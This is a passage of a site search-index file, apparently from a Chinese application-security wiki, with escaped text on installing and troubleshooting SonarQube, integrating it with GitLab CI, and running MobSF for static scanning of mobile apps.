\u6301\u7eed\u66f4\u65b0","title":"SonarQube\u8e29\u5751\u8bb0"},{"location":"application-security/code-audit/sonarqube-error/#sonarqube","text":"","title":"SonarQube\u8e29\u5751\u8bb0"},{"location":"application-security/code-audit/sonarqube-error/#rds","text":"sonar.jdbc.url=jdbc:mysql://address:3306/sonar?useUnicode=true characterEncoding=utf8","title":"\u8fde\u63a5\u963f\u91cc\u4e91RDS"},{"location":"application-security/code-audit/sonarqube-error/#sonarprojectkey","text":"\u5728gitlab-ci\u4e2d\u7ed9\u9879\u76ee\u547d\u540d\uff0c\u4e00\u822c\u662f\u4f7f\u7528\u73af\u5883\u53d8\u91cf\u3002\u4f46\u662f\u4e0d\u80fd\u4f7f\u7528\uff1aCI_COMMIT_REF_NAME \uff0c\u56e0\u4e3a\u4f7f\u7528\u8be5\u53d8\u91cf\u5f53\u9879\u76ee\u5206\u652f\u4e2d\u6709/ # \u7279\u6b8a\u5b57\u7b26\u65f6\uff0cgitlab-ci\u7684pipelines\u4f1a\u5931\u8d25\uff0c\u6240\u4ee5\u6211\u4eec\u9009\u62e9\u4f7f\u7528\uff1aCI_COMMIT_REF_SLUG\uff08\u5148\u5c06$CI_COMMIT_REF_NAME\u7684\u503c\u8f6c\u6362\u6210\u5c0f\u5199\uff0c\u6700\u5927\u4e0d\u80fd\u8d85\u8fc763\u4e2a\u5b57\u8282\uff0c\u7136\u540e\u628a\u9664\u4e860-9\u548ca-z\u7684\u5176\u4ed6\u5b57\u7b26\u8f6c\u6362\u6210-\u3002\u5728URLs\u548c\u57df\u540d\u540d\u79f0\u4e2d\u4f7f\u7528\uff09\u3002 GitLab CI/CD Variables \u4e2d\u6587\u6587\u6863","title":"sonar.projectKey\u547d\u540d"},{"location":"application-security/code-audit/sonarqube-error/#_1","text":"SonarQube\u9ed8\u8ba4\u9879\u76ee\u4e3a\u516c\u6709\uff0c\u8fd9\u4e2a\u65f6\u5019\u4e0d\u9700\u8981\u767b\u5f55\u4e5f\u53ef\u4ee5\u67e5\u770b\u9879\u76ee\u7684\u6f0f\u6d1e\uff0c\u9700\u8981\u767b\u5f55\u7cfb\u7edf\u540e\u4fee\u6539\u3002","title":"\u8bbe\u7f6e\u9879\u76ee\u9ed8\u8ba4\u4e3a\u79c1\u6709"},{"location":"application-security/code-audit/sonarqube-error/#sonarqubefindbugs","text":"sonar-scanner -Dsonar.host.url=http://10.10.10.12:9000 -Dsonar.login=token -Dsonar.projectKey=java-test -Dsonar.java.binaries=$PWD \u62a5\u9519\u4fe1\u606f ERROR: Error during SonarQube Scanner execution ERROR: Can not execute Findbugs ERROR: Caused by: One (sub)project contains Java source files that are not compiled (/home/gitlab-runner/builds/G5ijgmip/0/root/java). ERROR: ERROR: Re-run SonarQube Scanner using the -X switch to enable full debug logging. \u8fd9\u662f\u56e0\u4e3afindbugs\u68c0\u67e5\u7684\u662fclasses\u6587\u4ef6\uff0c\u6240\u4ee5\u5fc5\u987b\u5148\u5bf9\u9879\u76ee\u6267\u884c mvn compile # \u751f\u6210classes\u6587\u4ef6","title":"SonarQube\u5b89\u88c5FindBugs\u63d2\u4ef6\u540e\u4f7f\u7528\u9519\u8bef"},{"location":"application-security/code-audit/sonarqube-error/#_2","text":"\u62a5\u9519\u5982\u4e0b\uff1a ERROR: Unable to load component class org.sonar.scanner.report.MetadataPublisher ERROR: Caused by: Unable to load component class org.sonar.scanner.rule.QualityProfiles \u6301\u7eed\u66f4\u65b0","title":"\u4e0d\u5141\u8bb8\u76f4\u63a5\u4ece\u6570\u636e\u5e93\u5220\u9664\u89c4\u5219"},{"location":"application-security/code-audit/sonarqube/","text":"SonarQube\u5b89\u88c5\u4e0e\u4f7f\u7528 \u5b89\u88c5\u8fc7\u7a0b \u5907\u6ce8\uff1a\u6570\u636e\u5e93\u4e0d\u8981\u4f7f\u7528MariaDB\uff1b\u4e0d\u8981\u4f7f\u7528root\u7528\u6237\u5b89\u88c5\uff0ces\u4f1a\u542f\u52a8\u5931\u8d25 # \u5b89\u88c5java\u73af\u5883 yum install java-1.8.0-openjdk.x86_64 java-1.8.0-openjdk-devel.x86_64 -y # \u5b89\u88c5\u6570\u636e\u5e93 wget -i -c http://dev.mysql.com/get/mysql57-community-release-el7-10.noarch.rpm rpm -ivh mysql57-community-release-el7-10.noarch.rpm yum install mysql-community-server.x86_64 -y # \u914d\u7f6e\u6570\u636e\u5e93 systemctl start mysqld.service # \u6570\u636e\u5e93\u521d\u59cb\u5bc6\u7801 grep password /var/log/mysqld.log # \u4fee\u6539\u6570\u636e\u5e93\u5bc6\u7801 ALTER USER 'root'@'localhost' IDENTIFIED BY 'new password'; # \u521b\u5efa\u6570\u636e\u5e93sonar create database sonar; # \u4e0b\u8f7d\uff0c\u4ece\u8fd9\u91cc\u5f00\u59cb\u5e94\u8be5\u4f7f\u7528\u666e\u901a\u7528\u6237\u64cd\u4f5c wget https://binaries.sonarsource.com/Distribution/sonarqube/sonarqube-7.3.zip # \u89e3\u538b unzip sonarqube-7.3.zip cd sonarqube-7.3/ # \u4fee\u6539\u914d\u7f6e\u6587\u4ef6 vim ./conf/sonar.properties # \u53d6\u6d88\u6ce8\u91ca\u5982\u4e0b\u4e09\u884c\uff0c\u5e76\u6dfb\u52a0\u6570\u636e\u5e93\u8d26\u53f7\u5bc6\u7801 sonar.jdbc.username=root sonar.jdbc.password=password sonar.jdbc.url=jdbc:mysql://localhost:3306/sonar?useUnicode=true characterEncoding=utf8 rewriteBatchedStatements=true useConfigs=maxPerformance useSSL=false # \u5982\u679cjava\u73af\u5883\u662f\u914d\u7f6e\u5b89\u88c5\u7684\uff0c\u9700\u8981\u6307\u5b9ajava\u73af\u5883\uff1avim sonarqube-7.7/conf/wrapper.conf # \u542f\u52a8sonarqube ./bin/linux-x86-64/sonar.sh start # \u8bbf\u95ee\uff1ahttp://10.10.10.12:9000/sessions/new # \u8d26\u53f7\uff1aadmin \u5bc6\u7801\uff1aadmin # \u91cd\u542f\u670d\u52a1 ./bin/linux-x86-64/sonar.sh restart \u4f7f\u7528\u8fc7\u7a0b \u6c49\u5316 \u5728Administration\u83dc\u5355\u680f\uff0c\u9009\u62e9Marketplace\u6807\u9898\uff0c\u5728\u641c\u7d22\u6846\u8f93\u5165chinese\u8fdb\u884c\u641c\u7d22\uff0c\u7136\u540e\u8fdb\u884c\u5b89\u88c5 \u5b8c\u6210\u540e\u4f1a\u63d0\u793a\u91cd\u542f\u670d\u52a1 Sonar Scanner # \u4efb\u610f\u7528\u6237\u5747\u53ef wget https://binaries.sonarsource.com/Distribution/sonar-scanner-cli/sonar-scanner-cli-3.2.0.1227-linux.zip # \u89e3\u538b unzip sonar-scanner-cli-3.2.0.1227-linux.zip # \u6dfb\u52a0\u73af\u5883\u53d8\u91cf cd sonar-scanner-3.2.0.1227-linux/ vim /etc/profile export SONAR_SCANNER_HOME=/home/bloodzer0/sonar-scanner-3.2.0.1227-linux export PATH=$PATH:$SONAR_SCANNER_HOME/bin source /etc/profile # \u9a8c\u8bc1\u5b89\u88c5 sonar-scanner -v Sonar Scanner\u5206\u6790\u9879\u76ee \u70b9\u51fb\u9879\u76ee--\u5206\u6790\u65b0\u9879\u76ee JS\u3001Python\u3001PHP sonar-scanner \\ -Dsonar.projectKey=security-test \\ -Dsonar.sources=. \\ -Dsonar.host.url=http://10.10.10.12:9000 \\ -Dsonar.login=token \u6d4b\u8bd5sqlmap\u9879\u76ee\uff1a git clone https://github.com/sqlmapproject/sqlmap.git cd sqlmap # \u6267\u884c\u4e0a\u9762\u7684\u4ee3\u7801 # \u5206\u6790\u5b8c\u6210\u540e\uff0c\u5728web\u754c\u9762\u67e5\u770b\u5206\u6790\u7ed3\u679c Java-Maven mvn sonar:sonar \\ -Dsonar.host.url=http://10.10.10.12:9000 \\ -Dsonar.login=token Java-Gradle # \u5728build.gradle\u6587\u4ef6\u4e2d\u58f0\u660e plugins { id org.sonarqube version 2.6 } # \u7136\u540e\u6267\u884c\u547d\u4ee4 ./gradlew sonarqube \\ -Dsonar.host.url=http://10.10.10.12:9000 \\ -Dsonar.login=token C#\u6216VB.NET SonarScanner.MSBuild.exe begin /k: test /d:sonar.host.url= http://10.10.10.12:9000 /d:sonar.login= token MsBuild.exe /t:Rebuild SonarScanner.MSBuild.exe end /d:sonar.login= token \u4f7f\u7528\u914d\u7f6e\u6587\u4ef6\u8fdb\u884c\u626b\u63cf \u5728\u9879\u76ee\u76ee\u5f55\u65b0\u5efasonar-project.properties\u6587\u4ef6 # must be unique in a given SonarQube instance sonar.projectKey=my:project # this is the name and version displayed in the SonarQube UI. Was mandatory prior to SonarQube 6.1. sonar.projectName=My project sonar.projectVersion=1.0 # Path is relative to the sonar-project.properties file. Replace \\ by / on Windows. # This property is optional if sonar.modules is set. sonar.sources=. # Encoding of the source code. Default is default system encoding #sonar.sourceEncoding=UTF-8 \u96c6\u6210Gitlab-CI\u505a\u81ea\u52a8\u5316\u626b\u63cf gitlab-ci.yml\u6587\u4ef6\u5185\u5bb9 sast: stage: test script: - sonar-scanner -Dsonar.host.url=http://10.10.10.12:9000 -Dsonar.login=token -Dsonar.issuesReport.console.enable=True -Dsonar.projectKey=$CI_PROJECT_NAME -Dsonar.java.binaries=$PWD tags: - sec only: - master \u6839\u636eSonarQube\u7ed3\u679c\u6267\u884cpipelines \u914d\u7f6esonar\u8d28\u91cf\u9608\uff1b gitlab ci \u5224\u65ad sonar\u7684\u6267\u884c\u72b6\u6001\uff1b if curl http://10.10.10.5:9000/api/qualitygates/project_status?projectKey=go-language: | grep 'ERROR'; then echo error exit 1; fi \u53c2\u8003\u8d44\u6599 SonarQube\u4e4bgitlab-plugin\u914d\u5408gitlab-ci\u5b8c\u6210\u6bcf\u6b21commit\u4ee3\u7801\u68c0\u6d4b","title":"SonarQube\u5b89\u88c5\u4e0e\u4f7f\u7528"},{"location":"application-security/code-audit/sonarqube/#sonarqube","text":"","title":"SonarQube\u5b89\u88c5\u4e0e\u4f7f\u7528"},{"location":"application-security/code-audit/sonarqube/#_1","text":"\u5907\u6ce8\uff1a\u6570\u636e\u5e93\u4e0d\u8981\u4f7f\u7528MariaDB\uff1b\u4e0d\u8981\u4f7f\u7528root\u7528\u6237\u5b89\u88c5\uff0ces\u4f1a\u542f\u52a8\u5931\u8d25 # \u5b89\u88c5java\u73af\u5883 yum install java-1.8.0-openjdk.x86_64 java-1.8.0-openjdk-devel.x86_64 -y # \u5b89\u88c5\u6570\u636e\u5e93 wget -i -c http://dev.mysql.com/get/mysql57-community-release-el7-10.noarch.rpm rpm -ivh mysql57-community-release-el7-10.noarch.rpm yum install mysql-community-server.x86_64 -y # \u914d\u7f6e\u6570\u636e\u5e93 systemctl start mysqld.service # \u6570\u636e\u5e93\u521d\u59cb\u5bc6\u7801 grep password /var/log/mysqld.log # \u4fee\u6539\u6570\u636e\u5e93\u5bc6\u7801 ALTER USER 'root'@'localhost' IDENTIFIED BY 'new password'; # \u521b\u5efa\u6570\u636e\u5e93sonar create database sonar; # \u4e0b\u8f7d\uff0c\u4ece\u8fd9\u91cc\u5f00\u59cb\u5e94\u8be5\u4f7f\u7528\u666e\u901a\u7528\u6237\u64cd\u4f5c wget https://binaries.sonarsource.com/Distribution/sonarqube/sonarqube-7.3.zip # \u89e3\u538b unzip sonarqube-7.3.zip cd sonarqube-7.3/ # \u4fee\u6539\u914d\u7f6e\u6587\u4ef6 vim ./conf/sonar.properties # \u53d6\u6d88\u6ce8\u91ca\u5982\u4e0b\u4e09\u884c\uff0c\u5e76\u6dfb\u52a0\u6570\u636e\u5e93\u8d26\u53f7\u5bc6\u7801 sonar.jdbc.username=root sonar.jdbc.password=password sonar.jdbc.url=jdbc:mysql://localhost:3306/sonar?useUnicode=true characterEncoding=utf8 rewriteBatchedStatements=true useConfigs=maxPerformance useSSL=false # \u5982\u679cjava\u73af\u5883\u662f\u914d\u7f6e\u5b89\u88c5\u7684\uff0c\u9700\u8981\u6307\u5b9ajava\u73af\u5883\uff1avim sonarqube-7.7/conf/wrapper.conf # \u542f\u52a8sonarqube ./bin/linux-x86-64/sonar.sh start # \u8bbf\u95ee\uff1ahttp://10.10.10.12:9000/sessions/new # \u8d26\u53f7\uff1aadmin \u5bc6\u7801\uff1aadmin # \u91cd\u542f\u670d\u52a1 ./bin/linux-x86-64/sonar.sh restart","title":"\u5b89\u88c5\u8fc7\u7a0b"},{"location":"application-security/code-audit/sonarqube/#_2","text":"","title":"\u4f7f\u7528\u8fc7\u7a0b"},{"location":"application-security/code-audit/sonarqube/#_3","text":"\u5728Administration\u83dc\u5355\u680f\uff0c\u9009\u62e9Marketplace\u6807\u9898\uff0c\u5728\u641c\u7d22\u6846\u8f93\u5165chinese\u8fdb\u884c\u641c\u7d22\uff0c\u7136\u540e\u8fdb\u884c\u5b89\u88c5 \u5b8c\u6210\u540e\u4f1a\u63d0\u793a\u91cd\u542f\u670d\u52a1","title":"\u6c49\u5316"},{"location":"application-security/code-audit/sonarqube/#sonar-scanner","text":"# \u4efb\u610f\u7528\u6237\u5747\u53ef wget https://binaries.sonarsource.com/Distribution/sonar-scanner-cli/sonar-scanner-cli-3.2.0.1227-linux.zip # \u89e3\u538b unzip sonar-scanner-cli-3.2.0.1227-linux.zip # \u6dfb\u52a0\u73af\u5883\u53d8\u91cf cd sonar-scanner-3.2.0.1227-linux/ vim /etc/profile export SONAR_SCANNER_HOME=/home/bloodzer0/sonar-scanner-3.2.0.1227-linux export PATH=$PATH:$SONAR_SCANNER_HOME/bin source /etc/profile # \u9a8c\u8bc1\u5b89\u88c5 sonar-scanner -v","title":"Sonar Scanner"},{"location":"application-security/code-audit/sonarqube/#sonar-scanner_1","text":"\u70b9\u51fb\u9879\u76ee--\u5206\u6790\u65b0\u9879\u76ee","title":"Sonar Scanner\u5206\u6790\u9879\u76ee"},{"location":"application-security/code-audit/sonarqube/#jspythonphp","text":"sonar-scanner \\ -Dsonar.projectKey=security-test \\ -Dsonar.sources=. \\ -Dsonar.host.url=http://10.10.10.12:9000 \\ -Dsonar.login=token \u6d4b\u8bd5sqlmap\u9879\u76ee\uff1a git clone https://github.com/sqlmapproject/sqlmap.git cd sqlmap # \u6267\u884c\u4e0a\u9762\u7684\u4ee3\u7801 # \u5206\u6790\u5b8c\u6210\u540e\uff0c\u5728web\u754c\u9762\u67e5\u770b\u5206\u6790\u7ed3\u679c","title":"JS\u3001Python\u3001PHP"},{"location":"application-security/code-audit/sonarqube/#java-maven","text":"mvn sonar:sonar \\ -Dsonar.host.url=http://10.10.10.12:9000 \\ -Dsonar.login=token","title":"Java-Maven"},{"location":"application-security/code-audit/sonarqube/#java-gradle","text":"# \u5728build.gradle\u6587\u4ef6\u4e2d\u58f0\u660e plugins { id org.sonarqube version 2.6 } # \u7136\u540e\u6267\u884c\u547d\u4ee4 ./gradlew sonarqube \\ -Dsonar.host.url=http://10.10.10.12:9000 \\ -Dsonar.login=token","title":"Java-Gradle"},{"location":"application-security/code-audit/sonarqube/#cvbnet","text":"SonarScanner.MSBuild.exe begin /k: test /d:sonar.host.url= http://10.10.10.12:9000 /d:sonar.login= token MsBuild.exe /t:Rebuild SonarScanner.MSBuild.exe end /d:sonar.login= token","title":"C#\u6216VB.NET"},{"location":"application-security/code-audit/sonarqube/#_4","text":"\u5728\u9879\u76ee\u76ee\u5f55\u65b0\u5efasonar-project.properties\u6587\u4ef6 # must be unique in a given SonarQube instance sonar.projectKey=my:project # this is the name and version displayed in the SonarQube UI. Was mandatory prior to SonarQube 6.1. sonar.projectName=My project sonar.projectVersion=1.0 # Path is relative to the sonar-project.properties file. Replace \\ by / on Windows. # This property is optional if sonar.modules is set. sonar.sources=. # Encoding of the source code. Default is default system encoding #sonar.sourceEncoding=UTF-8","title":"\u4f7f\u7528\u914d\u7f6e\u6587\u4ef6\u8fdb\u884c\u626b\u63cf"},{"location":"application-security/code-audit/sonarqube/#gitlab-ci","text":"gitlab-ci.yml\u6587\u4ef6\u5185\u5bb9 sast: stage: test script: - sonar-scanner -Dsonar.host.url=http://10.10.10.12:9000 -Dsonar.login=token -Dsonar.issuesReport.console.enable=True -Dsonar.projectKey=$CI_PROJECT_NAME -Dsonar.java.binaries=$PWD tags: - sec only: - master","title":"\u96c6\u6210Gitlab-CI\u505a\u81ea\u52a8\u5316\u626b\u63cf"},{"location":"application-security/code-audit/sonarqube/#sonarqubepipelines","text":"\u914d\u7f6esonar\u8d28\u91cf\u9608\uff1b gitlab ci \u5224\u65ad sonar\u7684\u6267\u884c\u72b6\u6001\uff1b if curl http://10.10.10.5:9000/api/qualitygates/project_status?projectKey=go-language: | grep 'ERROR'; then echo error exit 1; fi","title":"\u6839\u636eSonarQube\u7ed3\u679c\u6267\u884cpipelines"},{"location":"application-security/code-audit/sonarqube/#_5","text":"SonarQube\u4e4bgitlab-plugin\u914d\u5408gitlab-ci\u5b8c\u6210\u6bcf\u6b21commit\u4ee3\u7801\u68c0\u6d4b","title":"\u53c2\u8003\u8d44\u6599"},{"location":"application-security/mobile-security/","text":"\u79fb\u52a8\u5b89\u5168 \u53c2\u8003\u8d44\u6599 \u4e92\u8054\u7f51\u516c\u53f8\u79fb\u52a8\u5b89\u5168\u9886\u57df\u7684\u63a2\u7d22\u4e0e\u5b9e\u8df5 \u79fb\u52a8APP\u6f0f\u6d1e\u81ea\u52a8\u5316\u68c0\u6d4b\u5e73\u53f0\u5efa\u8bbe","title":"\u79fb\u52a8\u5b89\u5168"},{"location":"application-security/mobile-security/#_1","text":"","title":"\u79fb\u52a8\u5b89\u5168"},{"location":"application-security/mobile-security/#_2","text":"\u4e92\u8054\u7f51\u516c\u53f8\u79fb\u52a8\u5b89\u5168\u9886\u57df\u7684\u63a2\u7d22\u4e0e\u5b9e\u8df5 \u79fb\u52a8APP\u6f0f\u6d1e\u81ea\u52a8\u5316\u68c0\u6d4b\u5e73\u53f0\u5efa\u8bbe","title":"\u53c2\u8003\u8d44\u6599"},{"location":"application-security/mobile-security/mobile-security-scanner/","text":"\u79fb\u52a8\u5b89\u5168\u626b\u63cf \u5229\u7528MobSF\u5b9e\u73b0\u81ea\u52a8\u5316\u626b\u63cf \u8c08\u5230MobSF\uff0c\u5927\u5bb6\u6700\u76f4\u89c2\u7684\u770b\u6cd5\u53ef\u80fd\u5c31\u662f\u9488\u5bf9Android/IOS/Windows\u81ea\u52a8\u6d4b\u8bd5\u6846\u67b6\uff0c\u80fd\u591f\u8fdb\u884c\u9759\u6001\u4e0e\u52a8\u6001\u5206\u6790\u3002 \u5728\u4e59\u65b9\uff0c\u66f4\u591a\u7684\u5b89\u5168\u5de5\u7a0b\u5e08\u628aMobSF\u4f5c\u4e3a\u4e00\u4e2a\u5b89\u5168\u6d4b\u8bd5\u5de5\u5177\u6765\u6316\u6398\u79fb\u52a8\u7aef\u7684\u6f0f\u6d1e\uff0c\u5728\u7532\u65b9\u4e5f\u66f4\u591a\u7684\u7528\u4e8e\u5b89\u5168\u6d4b\u8bd5\u5de5\u4f5c\u3002\u73b0\u5728\u7f51\u7edc\u4e0a\u516c\u5f00\u7684\u5173\u4e8eMobSF\u76f8\u5173\u6587\u6863\u4e5f\u4e3b\u8981\u662f\u5b89\u88c5\u4e0e\u57fa\u7840\u4f7f\u7528\uff0c\u5e76\u6ca1\u6709\u5f88\u597d\u7684\u5f62\u6210\u4e00\u4e2a\u6d41\u7a0b\u3002 \u4e3a\u4ec0\u4e48MobSF\u6ca1\u6709\u5728\u7532\u65b9\u63a8\u52a8\u8d77\u6765\uff1a\u6d4b\u8bd5\u53d1\u73b0\u7684\u5f88\u591a\u6f0f\u6d1e\u4e1a\u52a1\u90fd\u4f1a\u5ffd\u7565\u3002 \u90a3\u4e48\u5982\u4f55\u628aMobSF\u4f5c\u4e3a\u7532\u65b9\u79fb\u52a8\u5b89\u5168\u6d41\u7a0b\u4e2d\u7684\u4e00\u4e2a\u5173\u952e\u70b9\uff0c\u9996\u5148\u6211\u4eec\u8981\u601d\u8003\u51e0\u4e2a\u95ee\u9898\uff1a MobSF\u7cfb\u7edf\u8fd0\u884c\u7684\u7a33\u5b9a\u6027\uff1b \u5982\u4f55\u8fdb\u884c\u81ea\u52a8\u5316\u626b\u63cf\uff1b \u626b\u63cf\u7ed3\u679c\u5b58\u5728\u7684\u6f0f\u62a5\u3001\u8bef\u62a5\uff1b\u6216\u8005\u662f\u7cfb\u7edf\u8ba4\u4e3a\u5b58\u5728\u95ee\u9898\uff0c\u4f46\u662f\u5b9e\u9645\u5728\u4e1a\u52a1\u4e2d\u4efb\u52a1\u4e0d\u5b58\u5728\u5b89\u5168\u9690\u60a3\uff1b \u5982\u4f55\u5bf9\u7b2c\u4e09\u70b9\u63cf\u8ff0\u7684\u95ee\u9898\u8fdb\u884c\u5904\u7406\uff1b \u5904\u7406\u540e\u7684\u7ed3\u679c\u5982\u4f55\u81ea\u52a8\u63a8\u9001\u7ed9\u76f8\u5e94\u7684\u4e1a\u52a1/\u7814\u53d1\uff1b \u540e\u9762\u6211\u4eec\u5c31\u6839\u636e\u8fd9\u51e0\u70b9\u7684\u95ee\u9898\u6765\u601d\u8003\u89e3\u51b3\u65b9\u6848\uff08\u4ec5\u9650\u4e8e\u9759\u6001\u5206\u6790\u90e8\u5206\uff09 MobSF\u81ea\u52a8\u5316\u5b9e\u73b0 MobSF\u8fd0\u884c\u5206\u4e3a\u4e24\u79cd\u7c7b\u578b\uff1aDocker\u8fd0\u884c\u3001\u5b89\u88c5\u5728\u670d\u52a1\u5668/PC\u4e0a\uff0c\u63a8\u8350\u4f7f\u7528Docker\uff1a\u90e8\u7f72\u65b9\u4fbf\u3002 \u5229\u7528MobSF API\u8fdb\u884c\u81ea\u52a8\u5316\u626b\u63cf\uff1a API\u6587\u6863 \u6216\u8005\u4f7f\u7528MobSF CI\u9879\u76ee\u8fdb\u884c\uff1a MobSF-CI \u878d\u5165APP\u53d1\u5e03\u6d41\u7a0b\u4e2d\uff1a\u672a\u5b8c\u5f85\u7eed \u6392\u9664\u8bef\u62a5\u4e0e\u65e0\u7528\u6f0f\u6d1e \u76ee\u524d\u9488\u5bf9MobSF\u626b\u63cf\u51fa\u6765\u7684\u6f0f\u6d1e\uff0c\u6211\u4eec\u6700\u597d\u7684\u529e\u6cd5\u5c31\u662f\u5c06JSON\u683c\u5f0f\u7684report\u901a\u8fc7\u6b63\u5219\u8fdb\u884c\u4e8c\u6b21\u5904\u7406\uff0c\u6392\u9664\u6211\u4eec\u4e0d\u60f3\u8fdb\u884c\u9884\u8b66\u7684\u9009\u9879\u3002 \u5173\u4e8eMobSF\u7684\u603b\u7ed3 \u4ee3\u7801\u5ba1\u8ba1\u4e0e\u626b\u63cf\u90fd\u662f\u4e00\u4e2a\u9700\u8981\u4eba\u6765\u8fdb\u884c\u8fd0\u8425\u7684\u4e1c\u897f\uff0c\u5982\u679c\u5728\u6ca1\u6709\u7cbe\u529b\u80fd\u591f\u6295\u5165\u8fd9\u4e2a\u7248\u5757\u65f6\uff0c\u5b89\u5b89\u5fc3\u5fc3\u628aMobSF\u4f5c\u4e3a\u4e00\u4e2a\u6f0f\u6d1e\u6316\u6398\u5de5\u5177\u5c31\u597d\u4e86\u3002","title":"\u79fb\u52a8\u5b89\u5168\u626b\u63cf"},{"location":"application-security/mobile-security/mobile-security-scanner/#_1","text":"","title":"\u79fb\u52a8\u5b89\u5168\u626b\u63cf"},{"location":"application-security/mobile-security/mobile-security-scanner/#mobsf","text":"\u8c08\u5230MobSF\uff0c\u5927\u5bb6\u6700\u76f4\u89c2\u7684\u770b\u6cd5\u53ef\u80fd\u5c31\u662f\u9488\u5bf9Android/IOS/Windows\u81ea\u52a8\u6d4b\u8bd5\u6846\u67b6\uff0c\u80fd\u591f\u8fdb\u884c\u9759\u6001\u4e0e\u52a8\u6001\u5206\u6790\u3002 \u5728\u4e59\u65b9\uff0c\u66f4\u591a\u7684\u5b89\u5168\u5de5\u7a0b\u5e08\u628aMobSF\u4f5c\u4e3a\u4e00\u4e2a\u5b89\u5168\u6d4b\u8bd5\u5de5\u5177\u6765\u6316\u6398\u79fb\u52a8\u7aef\u7684\u6f0f\u6d1e\uff0c\u5728\u7532\u65b9\u4e5f\u66f4\u591a\u7684\u7528\u4e8e\u5b89\u5168\u6d4b\u8bd5\u5de5\u4f5c\u3002\u73b0\u5728\u7f51\u7edc\u4e0a\u516c\u5f00\u7684\u5173\u4e8eMobSF\u76f8\u5173\u6587\u6863\u4e5f\u4e3b\u8981\u662f\u5b89\u88c5\u4e0e\u57fa\u7840\u4f7f\u7528\uff0c\u5e76\u6ca1\u6709\u5f88\u597d\u7684\u5f62\u6210\u4e00\u4e2a\u6d41\u7a0b\u3002 \u4e3a\u4ec0\u4e48MobSF\u6ca1\u6709\u5728\u7532\u65b9\u63a8\u52a8\u8d77\u6765\uff1a\u6d4b\u8bd5\u53d1\u73b0\u7684\u5f88\u591a\u6f0f\u6d1e\u4e1a\u52a1\u90fd\u4f1a\u5ffd\u7565\u3002 \u90a3\u4e48\u5982\u4f55\u628aMobSF\u4f5c\u4e3a\u7532\u65b9\u79fb\u52a8\u5b89\u5168\u6d41\u7a0b\u4e2d\u7684\u4e00\u4e2a\u5173\u952e\u70b9\uff0c\u9996\u5148\u6211\u4eec\u8981\u601d\u8003\u51e0\u4e2a\u95ee\u9898\uff1a MobSF\u7cfb\u7edf\u8fd0\u884c\u7684\u7a33\u5b9a\u6027\uff1b \u5982\u4f55\u8fdb\u884c\u81ea\u52a8\u5316\u626b\u63cf\uff1b \u626b\u63cf\u7ed3\u679c\u5b58\u5728\u7684\u6f0f\u62a5\u3001\u8bef\u62a5\uff1b\u6216\u8005\u662f\u7cfb\u7edf\u8ba4\u4e3a\u5b58\u5728\u95ee\u9898\uff0c\u4f46\u662f\u5b9e\u9645\u5728\u4e1a\u52a1\u4e2d\u4efb\u52a1\u4e0d\u5b58\u5728\u5b89\u5168\u9690\u60a3\uff1b \u5982\u4f55\u5bf9\u7b2c\u4e09\u70b9\u63cf\u8ff0\u7684\u95ee\u9898\u8fdb\u884c\u5904\u7406\uff1b \u5904\u7406\u540e\u7684\u7ed3\u679c\u5982\u4f55\u81ea\u52a8\u63a8\u9001\u7ed9\u76f8\u5e94\u7684\u4e1a\u52a1/\u7814\u53d1\uff1b \u540e\u9762\u6211\u4eec\u5c31\u6839\u636e\u8fd9\u51e0\u70b9\u7684\u95ee\u9898\u6765\u601d\u8003\u89e3\u51b3\u65b9\u6848\uff08\u4ec5\u9650\u4e8e\u9759\u6001\u5206\u6790\u90e8\u5206\uff09","title":"\u5229\u7528MobSF\u5b9e\u73b0\u81ea\u52a8\u5316\u626b\u63cf"},{"location":"application-security/mobile-security/mobile-security-scanner/#mobsf_1","text":"MobSF\u8fd0\u884c\u5206\u4e3a\u4e24\u79cd\u7c7b\u578b\uff1aDocker\u8fd0\u884c\u3001\u5b89\u88c5\u5728\u670d\u52a1\u5668/PC\u4e0a\uff0c\u63a8\u8350\u4f7f\u7528Docker\uff1a\u90e8\u7f72\u65b9\u4fbf\u3002 \u5229\u7528MobSF API\u8fdb\u884c\u81ea\u52a8\u5316\u626b\u63cf\uff1a API\u6587\u6863 \u6216\u8005\u4f7f\u7528MobSF CI\u9879\u76ee\u8fdb\u884c\uff1a MobSF-CI \u878d\u5165APP\u53d1\u5e03\u6d41\u7a0b\u4e2d\uff1a\u672a\u5b8c\u5f85\u7eed","title":"MobSF\u81ea\u52a8\u5316\u5b9e\u73b0"},{"location":"application-security/mobile-security/mobile-security-scanner/#_2","text":"\u76ee\u524d\u9488\u5bf9MobSF\u626b\u63cf\u51fa\u6765\u7684\u6f0f\u6d1e\uff0c\u6211\u4eec\u6700\u597d\u7684\u529e\u6cd5\u5c31\u662f\u5c06JSON\u683c\u5f0f\u7684report\u901a\u8fc7\u6b63\u5219\u8fdb\u884c\u4e8c\u6b21\u5904\u7406\uff0c\u6392\u9664\u6211\u4eec\u4e0d\u60f3\u8fdb\u884c\u9884\u8b66\u7684\u9009\u9879\u3002","title":"\u6392\u9664\u8bef\u62a5\u4e0e\u65e0\u7528\u6f0f\u6d1e"},{"location":"application-security/mobile-security/mobile-security-scanner/#mobsf_2","text":"\u4ee3\u7801\u5ba1\u8ba1\u4e0e\u626b\u63cf\u90fd\u662f\u4e00\u4e2a\u9700\u8981\u4eba\u6765\u8fdb\u884c\u8fd0\u8425\u7684\u4e1c\u897f\uff0c\u5982\u679c\u5728\u6ca1\u6709\u7cbe\u529b\u80fd\u591f\u6295\u5165\u8fd9\u4e2a\u7248\u5757\u65f6\uff0c\u5b89\u5b89\u5fc3\u5fc3\u628aMobSF\u4f5c\u4e3a\u4e00\u4e2a\u6f0f\u6d1e\u6316\u6398\u5de5\u5177\u5c31\u597d\u4e86\u3002","title":"\u5173\u4e8eMobSF\u7684\u603b\u7ed3"},{"location":"application-security/mobile-security/mobile-tools/","text":"\u79fb\u52a8\u5b89\u5168\u5de5\u5177 Android MobSF \u79fb\u52a8\u5b89\u5168\u6846\u67b6\uff0c\u652f\u6301\uff1a\u9759\u6001\u5206\u6790APK\u3001IPA\u3001APPX\u6587\u4ef6\uff0c\u52a8\u6001\u5206\u6790APK\u4e0e\u5206\u6790Web API\u3002 github\u5730\u5740 Centos7\u5b89\u88c5MobSF # \u5b89\u88c5java\u73af\u5883 yum install java-1.8.0-openjdk.x86_64 java-1.8.0-openjdk-devel.x86_64 -y # \u5b89\u88c5python3 yum install https://centos7.iuscommunity.org/ius-release.rpm -y yum install python36u.x86_64 python36u-pip.noarch python36u-devel.x86_64 -y # \u5b89\u88c5MobSF git clone https://github.com/MobSF/Mobile-Security-Framework-MobSF.git cd Mobile-Security-Framework-MobSF pip3.6 install -r requirements.txt # 